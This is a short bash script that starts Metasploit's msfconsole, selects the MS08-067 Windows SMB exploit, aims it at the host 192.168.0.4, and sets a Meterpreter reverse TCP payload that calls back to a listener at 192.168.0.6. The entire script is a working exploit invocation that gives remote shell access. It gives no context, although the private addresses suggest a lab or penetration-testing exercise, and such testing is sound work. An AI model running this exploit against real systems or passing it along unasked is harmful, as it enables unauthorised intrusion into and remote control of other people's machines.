#!/bin/bash
msfconsole -x "use exploit/windows/smb/ms08_067_netapi;
set RHOST 192.168.0.4; 
set PAYLOAD windows/meterpreter/reverse_tcp; 
set LHOST 192.168.0.6; 
run"
